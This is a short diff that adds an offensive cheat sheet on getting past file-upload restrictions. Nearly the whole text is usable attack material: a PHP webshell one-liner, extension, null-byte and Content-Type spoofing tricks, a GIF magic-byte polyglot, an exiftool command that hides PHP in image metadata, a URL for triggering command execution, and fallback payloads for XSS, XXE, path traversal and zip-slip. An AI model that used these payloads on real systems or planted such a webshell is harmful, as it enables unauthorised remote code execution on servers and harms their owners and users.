@@ -1,0 +1,8 @@
+FILE UPLOAD BYPASS — QUICK REF
+
+Webshell:  <?php system($_GET['c']); ?>   → ?c=id     (match engine: php/jsp/aspx)
+Extension: .phtml .php5 .pht | shell.php.jpg | shell.PhP | shell.php%00.jpg | .htaccess AddType
+Content-Type: spoof header → Content-Type: image/png  (filename stays shell.php)
+Magic bytes:  GIF89a;<?php system($_GET['c']); ?>   | exiftool -Comment='<?php..?>' img.jpg
+Trigger:   http://<target>/uploads/shell.php?c=id   | ffuf dir if renamed
+No RCE?    SVG→XSS | SVG/XML→XXE | ../ traversal in filename | zip-slip
